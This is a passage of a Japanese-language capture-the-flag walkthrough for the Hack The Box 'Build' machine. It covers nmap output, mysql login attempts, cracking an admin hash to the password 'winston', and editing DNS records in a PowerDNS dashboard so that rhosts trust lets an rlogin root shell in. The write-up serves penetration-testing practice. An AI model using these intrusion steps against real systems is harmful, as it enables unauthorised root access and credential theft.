513/tcp  open  login            syn-ack ttl 64 OpenBSD or Solaris rlogind
514/tcp  open  shell            syn-ack ttl 64 Netkit rshd
873/tcp  open  rsync            syn-ack ttl 64
3000/tcp open  http             syn-ack ttl 64 Golang net/http server
| http-methods: 
|_  Supported Methods: HEAD GET
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=b95b9f51d6c24a26; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=-zQNKs7Fyn07eFToZ53c5GCXkOo6MTc1Njk2MzgxNjAyOTIyMDMyNg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 04 Sep 2025 05:30:16 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=8e5a3d4def2df49b; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=0sPuQyMzoicM7MShwvM3me4makA6MTc1Njk2MzgxNjQ1OTI2Nzk0NA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 04 Sep 2025 05:30:16 GMT
|_    Content-Length: 0
|_http-title: Gitea: Git with a cup of tea
3306/tcp open  mysql            syn-ack ttl 64 MariaDB 11.3.2
8081/tcp open  blackice-icecap? syn-ack ttl 64
|_mcafee-epo-agent: ePO Agent not found
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 9
|     Content-Type: text/plain; charset=utf-8
|     Found
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 401 Unauthorized
|     Connection: close
|     Content-Length: 12
|     Content-Type: text/plain; charset=utf-8
|     Www-Authenticate: Basic realm="PowerDNS"
|     Unauthorized
|   LDAPSearchReq, RTSPRequest, SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Length: 11
|     Content-Type: text/plain; charset=utf-8
|_    Request


```


buildadmの認証情報でログインできるかを試す
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Build]
└─$ mysql --protocol=TCP -h 172.18.0.1 -P 3306 -u buildadm -p --connect-timeout=5
Enter password: 
ERROR 2002 (HY000): Can't connect to server on '172.18.0.1' (110)

```

rootパスワードなしで接続する
```sh
mysql --protocol=TCP -h 172.18.0.1 -P 3306 -u root -p --connect-timeout=5
```

usersテーブルにadminのパスワードハッシュがあり、それをHaschcatで解読すると、winstonであることがわかる

172.18.06が80でポートが空いているのでアクセスする
Admin : winstonでログインする
- http://172.18.0.6/dashboard/
![](https://i.imgur.com/ailD2Fi.png)

dockerの構成がわかる
![](https://i.imgur.com/uje34us.png)
- rhostsにadminがあって、パスワードなしでログインできるのに、設定されていない
- 自分のマシンのIPからでログインできるように編集する
![](https://i.imgur.com/wnJygqh.png)


これでrootが取得できる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Build]
└─$  sudo rlogin 10.129.234.169
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Sep  4 06:34:16 AM UTC 2025

  System load:  1.69              Processes:             184
  Usage of /:   67.3% of 9.75GB   Users logged in:       0
  Memory usage: 40%               IPv4 address for eth0: 10.129.234.169
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@build:~# cat root.txt
```
